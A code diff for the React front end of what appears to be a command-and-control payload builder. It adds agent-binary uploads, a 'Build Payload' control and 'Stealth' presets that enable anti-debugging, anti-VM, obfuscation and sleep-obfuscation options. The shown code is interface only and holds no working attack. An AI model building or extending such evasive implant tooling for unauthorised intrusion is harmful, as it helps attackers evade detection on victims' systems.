+                    <p className="font-medium text-dark-100">Windows Agent (.exe)</p>
+                    <Input
+                      type="file"
+                      accept=".exe"
+                      onChange={(e) => handleFileUpload(e, 'windows')}
+                      className="bg-dark-900 border-dark-700"
+                    />
+                    <p className="text-xs text-dark-500">Upload a custom Windows x64 agent binary</p>
+                  </div>
+                  <div className="space-y-4">
+                    <p className="font-medium text-dark-100">Linux Agent (ELF)</p>
+                    <Input
+                      type="file"
+                      accept=""
+                      onChange={(e) => handleFileUpload(e, 'linux')}
+                      className="bg-dark-900 border-dark-700"
+                    />
+                    <p className="text-xs text-dark-500">Upload a custom Linux x86_64 agent binary</p>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          </TabsContent>
+        </Tabs>
+      </motion.div>
+
+      {/* Build Section */}
+      <motion.div
+        initial={{ opacity: 0, y: 20 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.4, delay: 0.2 }}
+      >
+        <Card className="card-hover border-accent-500/20">
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Zap className="w-5 h-5 text-accent-400" />
+              Build Payload
+            </CardTitle>
+            <CardDescription>Compile the agent with your configuration</CardDescription>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="flex flex-col sm:flex-row gap-4">
+              <Button 
+                size="lg" 
+                onClick={handleBuild} 
+                disabled={building}
+                className="flex-1 sm:flex-none"
+              >
+                {building ? (
+                  <>
+                    <Loader2 className="w-5 h-5 animate-spin mr-2" />
+                    Building...
+                  </>
+                ) : (
+                  <>
+                    <Zap className="w-5 h-5 mr-2" />
+                    Build Payload
+                  </>
+                )}
+              </Button>
+              <Button variant="outline" size="lg" onClick={() => setConfig(defaultConfig)} disabled={building}>
+                <RefreshCw className="w-5 h-5 mr-2" />
+                Reset Config
+              </Button>
+            </div>
+
+            {result && (
+              <div className={cn(
+                "p-4 rounded-lg border font-mono text-sm",
+                result.Success ? "bg-green-500/10 border-green-500/30 text-green-400" : "bg-red-500/10 border-red-500/30 text-red-400"
+              )}>
+                <div className="flex items-center justify-between mb-2">
+                  <span className="font-medium">
+                    {result.Success ? (
+                      <>
+                        <CheckCircle className="w-4 h-4 inline mr-2" />
+                        Build Successful
+                      </>
+                    ) : (
+                      <>
+                        <AlertCircle className="w-4 h-4 inline mr-2" />
+                        Build Failed
+                      </>
+                    )}
+                  </span>
+                  {result.Success && (
+                    <Button variant="ghost" size="sm" onClick={() => copyToClipboard(result.BinaryPath)}>
+                      <Copy className="w-4 h-4 mr-1" />
+                      Copy Path
+                    </Button>
+                  )}
+                </div>
+                {result.Success && (
+                  <div className="space-y-1">
+                    <div className="flex justify-between">
+                      <span className="text-dark-400">Binary:</span>
+                      <span>{result.BinaryName}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-dark-400">Size:</span>
+                      <span>{(result.Size / 1024).toFixed(1)} KB</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-dark-400">Checksum:</span>
+                      <span className="truncate max-w-[200px]">{result.Checksum}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-dark-400">Platform:</span>
+                      <span>{config.Platform} ({config.Arch})</span>
+                    </div>
                   </div>
                 )}
-
-                {buildResult && (
-                  <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
-                    <div className="flex items-center gap-3 mb-3">
-                      <CheckCircle className="w-6 h-6 text-green-500 flex-shrink-0" />
-                      <div>
-                        <p className="font-medium text-green-400">Build Successful!</p>
-                        <p className="text-dark-400 text-sm">Ready to download</p>
-                      </div>
-                    </div>
-                    <Button
-                      onClick={() => downloadPayload(buildResult.id, buildResult.filename)}
-                      className="w-full"
-                    >
-                      <Download className="w-4 h-4 mr-2" />
-                      Download {buildResult.filename}
-                    </Button>
-                  </div>
+                {!result.Success && result.Error && (
+                  <p className="mt-2">{result.Error}</p>
                 )}
               </div>
             )}
-          </TabContent>
 
-          <TabContent value="history" className="mt-6">
-            <div className="bg-dark-800/50 border border-dark-700 rounded-xl overflow-hidden">
-              {history.length === 0 ? (
-                <div className="p-12 text-center text-dark-500">
-                  <FileText className="w-12 h-12 mx-auto mb-4 opacity-30" />
-                  <p>No payloads built yet</p>
-                </div>
-              ) : (
-                <div className="overflow-x-auto">
-                  <table className="w-full">
-                    <thead>
-                      <tr className="border-b border-dark-700 bg-dark-900/50">
-                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Filename</th>
-                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Size</th>
-                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Created</th>
-                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Status</th>
-                        <th className="px-4 py-3 text-right text-sm font-medium text-dark-400">Actions</th>
-                      </tr>
-                    </thead>
-                    <tbody>
-                      {history.map((item) => (
-                        <tr key={item.id} className="border-b border-dark-700/50 hover:bg-dark-900/50">
-                          <td className="px-4 py-3 font-mono text-sm text-dark-100">{item.filename}</td>
-                          <td className="px-4 py-3 text-sm text-dark-400">
-                            {(item.size / 1024 / 1024).toFixed(2)} MB
-                          </td>
-                          <td className="px-4 py-3 text-sm text-dark-400">
-                            {new Date(item.created_at).toLocaleString()}
-                          </td>
-                          <td className="px-4 py-3">
-                            <span className={clsx(
-                              'px-2 py-1 rounded-full text-xs font-medium',
-                              item.status === 'completed' && 'bg-green-500/20 text-green-400',
-                              item.status === 'building' && 'bg-yellow-500/20 text-yellow-400',
-                              item.status === 'failed' && 'bg-red-500/20 text-red-400'
-                            )}>
-                              {item.status}
-                            </span>
-                          </td>
-                          <td className="px-4 py-3 text-right">
-                            <div className="flex items-center justify-end gap-2">
-                              {item.status === 'completed' && (
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => downloadPayload(item.id, item.filename)}
-                                >
-                                  <Download className="w-4 h-4" />
-                                </Button>
-                              )}
-                              <Button
-                                variant="ghost"
-                                size="sm"
-                                onClick={() => deletePayload(item.id)}
-                                className="text-red-400 hover:bg-red-500/10"
-                              >
-                                <X className="w-4 h-4" />
-                              </Button>
-                            </div>
-                          </td>
-                        </tr>
-                      ))}
-                    </tbody>
-                  </table>
-                </div>
-              )}
+            {/* Quick Config Presets */}
+            <div className="pt-4 border-t border-dark-700">
+              <p className="text-sm text-dark-400 mb-3">Quick Presets</p>
+              <div className="flex flex-wrap gap-2">
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: true, AntiVM: true, Obfuscation: true, SleepObfuscation: true }))}>
+                  <Shield className="w-3 h-3 mr-1" />
+                  Windows Stealth
+                </Button>
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'linux', Arch: 'x64', AntiDebug: true, AntiVM: true, Obfuscation: true, SleepObfuscation: true }))}>
+                  <Terminal className="w-3 h-3 mr-1" />
+                  Linux Stealth
+                </Button>
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: false, AntiVM: false, Obfuscation: false, SleepObfuscation: false }))}>
+                  <Bug className="w-3 h-3 mr-1" />
+                  Debug Build
+                </Button>
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x86' }))}>
+                  <Cpu className="w-3 h-3 mr-1" />
+                  Windows x86
+                </Button>
+                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'linux', Arch: 'arm64' }))}>
+                  <Cpu className="w-3 h-3 mr-1" />
+                  Linux ARM64
+                </Button>
+              </div>
             </div>
-          </TabContent>
-        </Tabs>
-      </div>
+          </CardContent>
+        </Card>
+      </motion.div>
     </div>
   )
 }
